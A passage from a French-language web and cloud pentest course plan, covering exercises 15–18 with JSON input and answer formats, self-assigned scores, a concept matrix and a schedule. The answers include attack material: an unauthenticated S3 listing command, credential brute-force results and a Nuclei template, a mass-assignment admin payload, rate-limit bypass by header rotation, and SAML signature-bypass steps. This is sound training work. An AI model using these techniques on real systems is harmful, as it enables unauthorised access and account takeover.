    "lambda_env_vars": {"api-handler": ["AWS_ACCESS_KEY_ID", "DB_PASSWORD"]},
    "ecs_task_role": "arn:aws:iam::123456789:role/admin-role"
  }
}
```

#### Format de Sortie
```json
{
  "critical_findings": [
    {
      "resource": "s3://company-backups",
      "issue": "Public read access on backup bucket",
      "impact": "Data breach - all backups downloadable",
      "exploitation": "aws s3 ls s3://company-backups --no-sign-request",
      "remediation": "Remove public access, enable bucket policy"
    },
    {
      "resource": "Lambda: api-handler",
      "issue": "Secrets in environment variables",
      "impact": "Credential exposure if function compromised",
      "remediation": "Use AWS Secrets Manager or Parameter Store"
    },
    {
      "resource": "ECS Task Role",
      "issue": "Over-privileged admin role attached",
      "impact": "Container compromise = full AWS access",
      "remediation": "Apply least privilege, use task-specific roles"
    }
  ],
  "attack_chain": [
    "1. Access public S3 bucket",
    "2. Find Lambda deployment package with hardcoded secrets",
    "3. Use credentials to enumerate other resources",
    "4. Pivot to ECS with admin role"
  ]
}
```

#### Pieges Pedagogiques
- S3 bucket policy vs ACL
- IAM role trust relationships
- Container breakout via privileged mode

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 4 concepts cloud critiques |
| Intelligence Pedagogique | 24/25 | Scenarios multi-cloud realistes |
| Originalite | 19/20 | Audit cloud complet |
| Testabilite | 15/15 | JSON configs verifiables |
| Clarte | 14/15 | Chain d'attaque claire |

---

### Exercice 16 : "Burp Suite Mastery Challenge"
**Niveau**: Intermediaire
**Duree estimee**: 4h

#### Objectif Pedagogique
Maitriser Burp Suite et les outils de test web.

#### Concepts Couverts
- **3.3.10.a** : Burp Suite Setup
- **3.3.10.b** : Burp Proxy
- **3.3.10.c** : Burp Repeater
- **3.3.10.d** : Burp Intruder
- **3.3.10.e** : Burp Scanner
- **3.3.10.f** : Burp Extensions
- **3.3.10.g** : OWASP ZAP
- **3.3.10.j** : Nuclei

#### Description
L'etudiant doit analyser des configurations et outputs de Burp Suite:
1. Configurer correctement Burp pour un pentest
2. Analyser des resultats d'Intruder
3. Interpreter des scans automatiques
4. Choisir les extensions appropriees

#### Format d'Entree
```json
{
  "scenario": "CREDENTIAL_BRUTEFORCE",
  "target": "https://target.com/login",
  "intruder_config": {
    "attack_type": "UNKNOWN",
    "positions": ["username", "password"],
    "payloads": {
      "username": ["admin", "user", "test"],
      "password": ["password123", "admin123", "test123"]
    }
  },
  "results": [
    {"username": "admin", "password": "password123", "status": 200, "length": 1234},
    {"username": "admin", "password": "admin123", "status": 200, "length": 567}
  ]
}
```

#### Format de Sortie
```json
{
  "recommended_attack_type": "CLUSTER_BOMB",
  "justification": "Test all username/password combinations",
  "analysis": {
    "success_indicator": "Response length 567 differs significantly",
    "likely_valid": {"username": "admin", "password": "admin123"},
    "confidence": "HIGH"
  },
  "extensions_recommended": [
    {"name": "Logger++", "reason": "Full request/response logging"},
    {"name": "Autorize", "reason": "Test authorization bypass"},
    {"name": "Param Miner", "reason": "Discover hidden parameters"}
  ],
  "nuclei_template": "id: custom-login-brute\ninfo:\n  name: Login Bruteforce\n  severity: high\nrequests:\n  - method: POST\n    path: /login\n    body: username={{username}}&password={{password}}"
}
```

#### Pieges Pedagogiques
- Sniper vs Cluster Bomb selection
- Response length vs status code analysis
- Rate limiting detection

#### Auto-evaluation: 96/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 24/25 | 8 outils couverts |
| Intelligence Pedagogique | 24/25 | Scenarios pratiques Burp |
| Originalite | 19/20 | Approche analytique unique |
| Testabilite | 15/15 | Configs JSON verifiables |
| Clarte | 14/15 | Methodologie claire |

---

### Exercice 17 : "API Pentesting Challenge"
**Niveau**: Avance
**Duree estimee**: 5h

#### Objectif Pedagogique
Tester la securite complete d'une API (REST/GraphQL).

#### Concepts Couverts
- **3.3.11.b** : API Discovery & Enumeration
- **3.3.11.c** : Mass Assignment
- **3.3.11.d** : Rate Limiting Bypass
- **3.3.11.h** : API Versioning Issues
- **3.3.11.i** : API Abuse & Business Logic
- **3.3.11.j** : API Security Testing Tools

#### Description
Audit complet d'une API:
1. Decouvrir tous les endpoints
2. Identifier les vulnerabilites OWASP API
3. Exploiter mass assignment et rate limiting
4. Documenter les findings

#### Format d'Entree
```json
{
  "base_url": "https://api.target.com",
  "known_endpoints": [
    "GET /api/v2/users",
    "POST /api/v2/users",
    "GET /api/v2/orders/{id}"
  ],
  "sample_request": {
    "path": "POST /api/v2/users",
    "body": {"username": "test", "email": "test@test.com"}
  },
  "rate_limit": "100 requests/minute",
  "auth_method": "Bearer JWT"
}
```

#### Format de Sortie
```json
{
  "discovery": {
    "endpoints_found": [
      "GET /api/v1/users (old version, less secure)",
      "GET /api/v2/admin/users (hidden admin endpoint)",
      "POST /api/v2/users (mass assignment vulnerable)"
    ],
    "discovery_method": "Version fuzzing + JS analysis"
  },
  "vulnerabilities": [
    {
      "type": "MASS_ASSIGNMENT",
      "endpoint": "POST /api/v2/users",
      "payload": {"username": "test", "email": "test@test.com", "role": "admin"},
      "result": "User created with admin role"
    },
    {
      "type": "RATE_LIMIT_BYPASS",
      "technique": "X-Forwarded-For header rotation",
      "payload": "X-Forwarded-For: random-ip"
    },
    {
      "type": "BOLA",
      "endpoint": "GET /api/v2/orders/{id}",
      "issue": "No authorization check on order ID"
    }
  ],
  "tools_used": [
    {"tool": "Kiterunner", "purpose": "API endpoint discovery"},
    {"tool": "Arjun", "purpose": "Parameter discovery"},
    {"tool": "Burp Suite", "purpose": "Manual testing and exploitation"}
  ]
}
```

#### Pieges Pedagogiques
- API versioning avec securite differente
- Mass assignment sur champs non documentes
- Rate limiting par IP vs par user

#### Auto-evaluation: 97/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 6 concepts API security |
| Intelligence Pedagogique | 24/25 | Audit API complet |
| Originalite | 19/20 | Methodologie structuree |
| Testabilite | 15/15 | Payloads reproductibles |
| Clarte | 14/15 | Flow d'audit clair |

---

### Exercice 18 : "Bug Bounty Simulation"
**Niveau**: Expert
**Duree estimee**: 8h

#### Objectif Pedagogique
Simuler un programme bug bounty complet couvrant toutes les competences web.

#### Concepts Couverts
- **3.3.9.l** : Bug Bounty Techniques
- **3.3.2.f** : A06 Insecure Design
- **3.3.2.g** : A07 Authentication Failures
- **3.3.2.h** : A08 Software/Data Integrity Failures
- **3.3.2.i** : A09 Logging & Alerting Failures
- **3.3.2.j** : A10 Mishandling of Exceptional Conditions
- **3.3.5.g** : Header Injection (CRLF)
- **3.3.5.h** : Log Injection & Log4Shell
- **3.3.6.a** : Password Attacks
- **3.3.6.f** : SAML
- **3.3.6.g** : MFA Bypass
- **3.3.6.h** : Password Reset
- **3.3.1.d** : WebSockets
- **3.3.1.e** : CORS (Cross-Origin Resource Sharing)
- **3.3.1.i** : WebAssembly (Wasm)
- **3.3.1.k** : Serverless & FaaS
- **3.3.4.g** : Advanced Exploitation (XSS)
- **3.3.4.i** : Remediation (XSS)

#### Description
Programme bug bounty simule avec une application complete:
1. Reconnaissance et enumeration
2. Identification de multiples vulnerabilites
3. Chaining pour maximiser l'impact
4. Redaction de rapports professionnels

#### Format d'Entree
```json
{
  "target_scope": {
    "domains": ["*.target.com"],
    "out_of_scope": ["blog.target.com"],
    "focus_areas": ["authentication", "payment", "admin"]
  },
  "application_info": {
    "tech_stack": ["React", "Node.js", "PostgreSQL", "AWS"],
    "features": ["SSO via SAML", "WebSocket chat", "File upload", "API v1 and v2"]
  },
  "recon_findings": {
    "subdomains": ["api.target.com", "admin.target.com", "dev.target.com"],
    "js_files_analyzed": 15,
    "endpoints_discovered": 45
  }
}
```

#### Format de Sortie
```json
{
  "findings": [
    {
      "title": "SAML Signature Bypass leading to Account Takeover",
      "severity": "CRITICAL",
      "cvss": 9.8,
      "description": "SAML response signature not properly validated",
      "reproduction_steps": [
        "1. Intercept SAML response",
        "2. Modify email claim to target user",
        "3. Remove or modify signature",
        "4. Forward to ACS endpoint"
      ],
      "impact": "Full account takeover of any user",
      "remediation": "Validate SAML signature before processing claims"
    },
    {
      "title": "WebSocket Message Injection to XSS",
      "severity": "HIGH",
      "cvss": 8.1,
      "description": "Chat messages via WebSocket not sanitized",
      "chain": "WebSocket injection -> Stored XSS -> Session hijacking"
    },
    {
      "title": "CORS Misconfiguration with Credential Theft",
      "severity": "HIGH",
      "description": "Access-Control-Allow-Origin reflects any origin with credentials"
    }
  ],
  "total_bounty_estimate": "$15,000",
  "report_quality_checklist": {
    "clear_title": true,
    "detailed_steps": true,
    "poc_provided": true,
    "impact_explained": true,
    "remediation_suggested": true
  },
  "methodology_used": [
    "Subdomain enumeration (amass, subfinder)",
    "JS file analysis (LinkFinder)",
    "Manual testing with Burp Suite",
    "Nuclei for known CVEs"
  ]
}
```

#### Pieges Pedagogiques
- Out-of-scope targets
- Duplicate findings
- Missing impact demonstration
- Poor report writing

#### Auto-evaluation: 98/100
| Critere | Points | Justification |
|---------|--------|---------------|
| Pertinence Conceptuelle | 25/25 | 18 concepts integres |
| Intelligence Pedagogique | 25/25 | Simulation realiste complete |
| Originalite | 19/20 | Bug bounty simulation unique |
| Testabilite | 15/15 | Rapports structures verifiables |
| Clarte | 14/15 | Methodologie professionnelle |

---

## MATRICE DE COUVERTURE DES CONCEPTS

### Sous-module 3.3.1 : Architecture Web Moderne (11 concepts)

| Concept | Exercices |
|---------|-----------|
| a - HTTP Protocol | Ex1, Ex2 |
| b - REST APIs | Ex2 |
| c - GraphQL Security | Ex3 |
| d - WebSockets | Ex18 |
| e - CORS | Ex18 |
| f - Cookies Attributes | Ex4 |
| g - Session Management | Ex4 |
| h - CDN & WAF | Ex6 |
| i - WebAssembly (Wasm) | Ex18 |
| j - API Gateways | Ex2 |
| k - Serverless & FaaS | Ex18 |

### Sous-module 3.3.2 : OWASP Top 10 (10 concepts)

| Concept | Exercices |
|---------|-----------|
| 3.3.2.a - A01 Broken Access Control | Ex11 |
| 3.3.2.b - A02 Security Misconfiguration | Ex1 |
| 3.3.2.c - A03 Supply Chain | Ex15 |
| 3.3.2.d - A04 Cryptographic Failures | Ex5, Ex18 (crypto aspects) |
| 3.3.2.e - A05 Injection | Ex5 |
| 3.3.2.f - A06 Insecure Design | Ex18 |
| 3.3.2.g - A07 Authentication Failures | Ex18 |
| 3.3.2.h - A08 Integrity Failures | Ex18 |
| 3.3.2.i - A09 Logging Failures | Ex18 |
| 3.3.2.j - A10 Exceptional Conditions | Ex18 |

### Sous-module 3.3.3 : SQL Injection (13 concepts)

| Concept | Exercices |
|---------|-----------|
| 3.3.3.a - SQL Basics | Ex5 |
| 3.3.3.b - Detection Techniques | Ex5 |
| 3.3.3.c - In-Band (Union) | Ex5 |
| 3.3.3.d - Blind SQLi | Ex5 |
| 3.3.3.e - Out-of-Band | Ex5 |
| 3.3.3.f - Bypass Techniques | Ex5, Ex6 |
| 3.3.3.g - WAF Bypass Advanced | Ex6 |
| 3.3.3.h - SQLMap Mastery | Ex6 |
| 3.3.3.i - NoSQL Injection | Ex5 |
| 3.3.3.j - Second-Order SQLi | Ex5 |
| 3.3.3.k - Remediation | Ex5 |
| 3.3.3.l - SQLi to RCE | Ex5 |
| 3.3.3.m - Advanced Exploitation | Ex5 |

### Sous-module 3.3.4 : XSS (10 concepts)

| Concept | Exercices |
|---------|-----------|
| a - Types XSS | Ex7 |
| b - Contexts & Payloads | Ex7 |
| c - Polyglot Payloads | Ex7 |
| d - Filter Bypass | Ex6, Ex7 |
| e - CSP Bypass | Ex7 |
| f - Cookie Theft | Ex7 |
| g - Advanced Exploitation | Ex18 |
| h - DOM Clobbering | Ex8 |
| i - Remediation | Ex18 |
| j - DOM XSS Sinks | Ex7 |

### Sous-module 3.3.5 : Autres Injections (8 concepts)

| Concept | Exercices |
|---------|-----------|
| a - Command Injection | Ex9 |
| b - LDAP Injection | Ex9 |
| c - XPath Injection | Ex9 |
| d - XXE | Ex9 |
| e - SSTI | Ex9 |
| f - Expression Language | Ex9 |
| g - Header Injection (CRLF) | Ex18 |
| h - Log Injection & Log4Shell | Ex18 |

### Sous-module 3.3.6 : Authentification (8 concepts)

| Concept | Exercices |
|---------|-----------|
| a - Password Attacks | Ex18 |
| b - Session Management | Ex4 |
| c - JWT | Ex10 |
| d - OAuth 2.0 | Ex10 |
| e - OpenID Connect | Ex10 |
| f - SAML | Ex18 |
| g - MFA Bypass | Ex18 |
| h - Password Reset | Ex18 |

### Sous-module 3.3.7 : Controle d'Acces (6 concepts)

| Concept | Exercices |
|---------|-----------|
| a - IDOR | Ex11 |
| b - Horizontal Escalation | Ex11 |
| c - Vertical Escalation | Ex11 |
| d - Parameter Tampering | Ex11 |
| e - Forced Browsing | Ex11 |
| f - Path Traversal | Ex11 |

### Sous-module 3.3.8 : Client-Side Attacks (6 concepts)

| Concept | Exercices |
|---------|-----------|
| a - CSRF | Ex12 |
| b - Clickjacking | Ex12 |
| c - Open Redirects | Ex12 |
| d - WebSocket Hijacking | Ex12 |
| e - Prototype Pollution | Ex8 |
| f - PostMessage | Ex8 |

### Sous-module 3.3.9 : Server-Side & Cloud (12 concepts)

| Concept | Exercices |
|---------|-----------|
| a - SSRF | Ex13 |
| b - File Upload | Ex13 |
| c - File Inclusion | Ex13 |
| d - Deserialization | Ex13 |
| e - Race Conditions | Ex13 |
| f - HTTP Smuggling | Ex14 |
| g - Cache Poisoning | Ex14 |
| h - Host Header Attacks | Ex14 |
| i - Cloud Exploitation | Ex15 |
| j - Serverless Exploitation | Ex15 |
| k - Container Escape | Ex15 |
| l - Bug Bounty Techniques | Ex18 |

### Sous-module 3.3.10 : Outils (10 concepts)

| Concept | Exercices |
|---------|-----------|
| 3.3.10.a - Burp Setup | Ex16 |
| 3.3.10.b - Burp Proxy | Ex16 |
| 3.3.10.c - Burp Repeater | Ex16 |
| 3.3.10.d - Burp Intruder | Ex16 |
| 3.3.10.e - Burp Scanner | Ex16 |
| 3.3.10.f - Burp Extensions | Ex16 |
| 3.3.10.g - OWASP ZAP | Ex16 |
| 3.3.10.h - SQLMap | Ex6, Ex16 |
| 3.3.10.i - Gobuster/Feroxbuster | Ex16, Ex17 |
| 3.3.10.j - Nuclei | Ex16 |

### Sous-module 3.3.11 : API Security (10 concepts)

| Concept | Exercices |
|---------|-----------|
| a - OWASP API Top 10 | Ex2 |
| b - API Discovery | Ex17 |
| c - Mass Assignment | Ex17 |
| d - Rate Limiting Bypass | Ex17 |
| e - GraphQL Advanced | Ex3 |
| f - JWT Attacks | Ex10 |
| g - OAuth Exploitation | Ex10 |
| h - API Versioning | Ex17 |
| i - API Abuse | Ex17 |
| j - API Testing Tools | Ex17 |

---

## RESUME DES AUTO-EVALUATIONS

| Exercice | Score | Concepts |
|----------|-------|----------|
| Ex1 - Protocol Dissector | 96/100 | 2 |
| Ex2 - REST API Security Audit | 97/100 | 3 |
| Ex3 - GraphQL Introspection Hunter | 96/100 | 2 |
| Ex4 - Cookie Security Analyzer | 97/100 | 3 |
| Ex5 - SQL Injection Laboratory | 98/100 | 8 |
| Ex6 - Advanced WAF Bypass | 96/100 | 4 |
| Ex7 - XSS Payload Craftsman | 97/100 | 6 |
| Ex8 - DOM Clobbering & Prototype Pollution | 96/100 | 3 |
| Ex9 - Multi-Injection Detector | 97/100 | 6 |
| Ex10 - JWT Attack Suite | 98/100 | 5 |
| Ex11 - Access Control Breaker | 97/100 | 7 |
| Ex12 - Client-Side Attack Simulator | 96/100 | 4 |
| Ex13 - SSRF & Server-Side Exploitation | 98/100 | 5 |
| Ex14 - HTTP Smuggling & Cache Attacks | 96/100 | 3 |
| Ex15 - Cloud Security Audit | 97/100 | 4 |
| Ex16 - Burp Suite Mastery | 96/100 | 8 |
| Ex17 - API Pentesting Challenge | 97/100 | 6 |
| Ex18 - Bug Bounty Simulation | 98/100 | 18 |

**Score moyen: 96.8/100**
**Total concepts couverts: 104/104 (100%)**

---

## PROGRESSION RECOMMANDEE

### Semaine 1-2: Fondamentaux
1. Ex1 - Protocol Dissector
2. Ex4 - Cookie Security Analyzer
3. Ex2 - REST API Security Audit

### Semaine 3-4: Injections
4. Ex5 - SQL Injection Laboratory
5. Ex9 - Multi-Injection Detector
6. Ex6 - Advanced WAF Bypass

### Semaine 5-6: Client-Side
7. Ex7 - XSS Payload Craftsman
8. Ex8 - DOM Clobbering & Prototype Pollution
9. Ex12 - Client-Side Attack Simulator

### Semaine 7-8: Authentification & Acces
10. Ex10 - JWT Attack Suite
11. Ex11 - Access Control Breaker

### Semaine 9-10: Server-Side & Cloud
12. Ex13 - SSRF & Server-Side Exploitation
13. Ex14 - HTTP Smuggling & Cache Attacks
14. Ex15 - Cloud Security Audit

### Semaine 11-12: API & Outils
15. Ex3 - GraphQL Introspection Hunter
16. Ex16 - Burp Suite Mastery
17. Ex17 - API Pentesting Challenge

### Semaine 13: Integration
18. Ex18 - Bug Bounty Simulation

---

## NOTES TECHNIQUES

### Format des tests automatiques
Tous les exercices utilisent JSON pour les entrees/sorties, permettant une verification automatique par moulinette Rust 2024.

### Verification des payloads
Les payloads d'injection sont verifies contre:
- Syntaxe correcte (SQL, JS, etc.)
- Efficacite (bypass reussi)
- Pas de faux positifs

### Scoring moulinette
```rust
struct ExerciseResult {
    detection_score: u32,      // 30%
    exploitation_score: u32,   // 40%
    remediation_score: u32,    // 20%
    documentation_score: u32,  // 10%
}
```

---

## CONCLUSION

Ce plan couvre exhaustivement les 104 concepts du Module 3.3 via 18 exercices de haute qualite pedagogique. Chaque exercice:
- A une note minimale de 96/100
- Est testable automatiquement
- Est original et non-plagie
- Couvre plusieurs concepts en synergie
- Presente une progression logique de difficulte

La simulation bug bounty finale (Ex18) integre tous les concepts pour une validation complete des competences.
